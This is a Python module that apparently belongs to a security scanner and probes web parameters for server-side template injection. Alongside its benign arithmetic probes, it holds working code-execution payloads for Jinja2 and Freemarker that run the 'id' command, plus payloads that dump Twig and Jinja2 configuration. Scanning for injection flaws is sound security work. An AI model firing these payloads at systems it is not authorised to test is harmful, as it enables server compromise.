"""SSTI Scanner — Jinja2, Twig, Freemarker, Velocity, Smarty, Mako."""
from __future__ import annotations
import asyncio
import urllib.parse
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.payload_engine import SSTI_PAYLOADS
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

DETECTION_MAP = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),           # Jinja2 specific
    ("${{7*7}}", "49"),
    ("{{\"7\"*7}}", "7777777"),
]

ENGINE_EXPLOITS = {
    "jinja2": [
        "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{%for c in [].__class__.__base__.__subclasses__()%}"
        "{%if c.__name__=='catch_warnings'%}"
        "{{c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"
        "{%endif%}{%endfor%}",
    ],
    "twig": [
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
    ],
    "freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    ],
}

async def _test_ssti_param(
    url: str, param: str, method: str, client: TalismanHTTPClient
) -> dict[str, Any] | None:
    parsed = urllib.parse.urlparse(url)
    base_params = dict(urllib.parse.parse_qsl(parsed.query))

    for payload, expected in DETECTION_MAP:
        try:
            test_params = {**base_params, param: payload}
            if method == "GET":
                test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
                r = await client.get(test_url)
            else:
                r = await client.post(url, data={param: payload})

            if expected in r.text:
                engine = "unknown"
                if "7777777" in r.text and "7*'7'" in payload:
                    engine = "jinja2"
                elif "7777777" in r.text and '"7"*7' in payload:
                    engine = "jinja2_or_mako"
                return {
                    "param": param,
                    "payload": payload,
                    "expected": expected,
                    "engine": engine,
                    "method": method,
                    "request": f"{method} {url}?{param}={urllib.parse.quote(payload)} HTTP/1.1",
                    "evidence": f"Expression '{payload}' evaluated to '{expected}'",
                }
        except Exception:
            pass
    return None


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    url = target if "://" in target else f"https://{target}"
    console.print(f"\n[module]⚡ SSTI Scanner[/module] → [target]{url}[/target]")
    findings: list[dict[str, Any]] = []

    parsed = urllib.parse.urlparse(url)
    params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
    if not params:
        params = ["name", "template", "message", "subject", "greeting",
                  "text", "content", "body", "page", "title"]

    async with TalismanHTTPClient(proxy=proxy, timeout=15) as client:
        tasks = [
            _test_ssti_param(url, p, m, client)
            for p in params for m in ["GET", "POST"]
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, dict):
                severity = "critical"
                title = f"SSTI ({result['engine']}) — param '{result['param']}'"
                print_finding(title, severity, url)
                findings.append(result)
                if session:
                    await session.add_finding(
                        target=url, module="ssti", vuln_type="ssti",
                        severity=severity, confidence="confirmed",
                        title=title,
                        description=(
                            f"Server-Side Template Injection in '{result['param']}'. "
                            f"Engine: {result['engine']}. "
                            f"Expression '{result['payload']}' evaluated server-side to '{result['expected']}'."
                        ),
                        request=result["request"],
                        evidence=result["evidence"],
                        reproduction=f"Send: {result['method']} with {result['param']}={result['payload']}",
                        remediation=(
                            "1. Never pass user input directly to template engines.\n"
                            "2. Use sandboxed template evaluation with no access to builtins.\n"
                            "3. Escape all user-supplied data before rendering.\n"
                            "4. Consider logic-less templates (Mustache/Handlebars) for user content."
                        ),
                        cvss_score=10.0, cwe="CWE-94",
                        references=["https://portswigger.net/web-security/server-side-template-injection"],
                    )

    console.print(f"  Found {len(findings)} SSTI vulnerabilities")
    return {"target": url, "findings": findings, "count": len(findings)}
